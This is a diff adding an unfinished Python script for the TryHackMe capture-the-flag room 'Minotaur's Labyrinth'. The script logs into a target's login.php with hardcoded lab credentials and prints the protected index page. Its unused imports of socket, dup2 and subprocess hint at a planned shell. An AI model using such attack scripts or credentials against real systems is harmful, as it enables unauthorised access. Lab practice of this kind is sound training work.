@@ -1,0 +1,25 @@
+#!/usr/bin/env python3
+#made on mar 31 2023
+#TryHackMe's "Minotaur's Labyrinth"
+#made in python3
+#Testing phase
+import requests as req
+import sys
+import pprint
+import socket
+from os import dup2
+from subprocess import run
+
+tar_ip = sys.argv[1] #target IP
+
+def Mino_web_engine():
+    sess = req.Session()
+    url = f'http://{tar_ip}/login.php'
+    PostData = {'email': 'Daedalus', 'password': 'g2e55kh4ck5r'}
+    sess.post(url, data=PostData)
+
+    sec_url = f'http://{tar_ip}/index.php'
+    RetReq = sess.get(sec_url)
+    print(RetReq.text)
+
+Mino_web_engine()
